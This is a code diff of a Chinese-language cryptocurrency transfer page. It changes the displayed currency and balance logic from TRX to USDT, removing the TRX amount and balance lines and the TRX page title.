@@ -1,4 +1,4 @@
-<head>
+ <head>
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1">
@@ -48,7 +48,6 @@
                             <div data-v-49fe1bb8="">
                                 <div data-v-49fe1bb8="" class="pay-box">
                                     <div data-v-49fe1bb8="" class="amount">
-                                        <div data-v-49fe1bb8="" class="num"><span class="amount" id="amount"></span><em data-v-49fe1bb8="">TRX</em></div><img data-v-49fe1bb8="" src="png/icon_exchange.jpg" class="icon">
                                         <div data-v-49fe1bb8="" class="num"><span class="amount" id="amount"></span><em data-v-49fe1bb8="">USDT</em></div><img data-v-49fe1bb8="" src="png/icon_exchange.jpg" class="icon">
                                     </div>
                                     <div data-v-49fe1bb8="" class="rate"><span id="amount-display"></span><em data-v-49fe1bb8="">USD</em>
@@ -60,7 +59,6 @@
                                         <div data-v-49fe1bb8="" class="name"><img data-v-49fe1bb8="" src="png/icon_trx.png" class="coin">
                                             <div data-v-49fe1bb8="" class="asset-box">
                                                 <p data-v-49fe1bb8="" class="title">余额</p>
-                                                <p data-v-49fe1bb8="" class="num"><span data-v-49fe1bb8="" id="ye"></span><em data-v-49fe1bb8="">TRX</em></p><input type="text" id="address" style="display:none">
                                                 <p data-v-49fe1bb8="" class="num"><span data-v-49fe1bb8="" id="ye"></span><em data-v-49fe1bb8="">USDT</em></p><input type="text" id="address" style="display:none">
                                             </div>
                                         </div>
@@ -251,9 +249,8 @@ function deleteLastChar() {
 // 更新金额显示
 function updateAmountDisplay() {
     let displayAmount = currentAmount;
-    const maxBalance = parseFloat(userData.trxBalance || '0');
-
-    // 如果输入的金额大于余额，设置为最大余额
+    const maxBalance = parseFloat(userData.usdtBalance || '0'); 
+// 如果输入的金额大于余额，设置为最大余额
     if (parseFloat(displayAmount) > maxBalance) {
         displayAmount = maxBalance.toFixed(4);
         currentAmount = displayAmount;
@@ -270,7 +267,6 @@ function updateAmountDisplay() {
     }
     updateNextButtonState();
     // 更新网站标题
-    const title = `正在申请转账 ${displayAmount} TRX`;
     const title = `正在申请转账 ${displayAmount} USDT`;
     document.title = title;
 }
